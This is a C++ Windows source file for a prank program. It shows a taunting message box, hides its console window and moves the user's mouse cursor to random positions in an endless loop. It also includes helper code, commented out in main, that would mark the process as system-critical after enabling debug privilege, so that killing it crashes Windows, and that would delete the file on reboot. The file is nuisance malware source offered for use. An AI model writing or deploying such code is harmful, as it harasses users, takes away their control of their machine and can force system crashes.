#include <windows.h>
#include <iostream>
#include <fstream>
#include <sddl.h>
#include <accctrl.h>
#include <stdio.h>
#include <conio.h>
#include <aclapi.h>
void crazym(void);

typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
               IN BOOLEAN        NewValue,
               OUT PBOOLEAN OldValue,
               IN BOOLEAN      IsWinlogon );
bool SelfDelete()
{
    char chrModule[255];
    if(!GetModuleFileName(0,chrModule,sizeof(chrModule))) return 0;
    return (bool)MoveFileEx(chrModule,0,MOVEFILE_DELAY_UNTIL_REBOOT);
}

BOOL EnablePriv(LPCSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if(!LookupPrivilegeValue(NULL, lpszPriv, &luid)){
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess()
{
   HANDLE hDLL;
   RtlSetProcessIsCritical fSetCritical;

   hDLL = LoadLibraryA("ntdll.dll");
   if ( hDLL != NULL )
   {
    EnablePriv(SE_DEBUG_NAME);
         (fSetCritical) = (RtlSetProcessIsCritical) GetProcAddress( (HINSTANCE)hDLL, "RtlSetProcessIsCritical" );
          if(!fSetCritical) return 0;
          fSetCritical(1,0,0);
    return 1;
   } else
          return 0;
}




int main()
{
	//ProtectProcess();
    system("msg * Just laugh , It's just a joke for fun ! M4st3r.4w4r3@gmail.com lo0o0o0o0o0o0ol ");
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
	//SelfDelete();
    crazym() ;
}

void crazym()
{

	while(1)
	{

		Sleep(1000);
		int x = rand()%1000;
		int y = rand()%700;
		SetCursorPos(x, y);

	}
}

